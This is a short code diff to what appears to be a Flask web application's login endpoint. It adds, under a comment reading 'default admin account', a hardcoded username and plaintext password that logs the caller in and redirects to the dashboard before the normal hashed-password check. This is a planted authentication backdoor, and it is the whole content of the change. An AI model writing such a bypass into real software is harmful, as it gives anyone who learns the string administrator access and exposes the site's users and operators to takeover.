@@ -70,6 +70,13 @@ def ping():
 def api_login():
     data = request.get_json()
     u, p = data.get("username", "").strip(), data.get("password", "").strip()
+    
+    # حساب المسؤول الافتراضي (Admin)
+    if u == "OMAR_ADMIN" and p == "OMAR_2026_BRO":
+        session['username'] = u
+        session.permanent = True
+        return jsonify({"success": True, "redirect": "/dashboard"})
+        
     user = db["users"].get(u)
     if user and user["password"] == hashlib.sha256(p.encode()).hexdigest():
         session['username'] = u
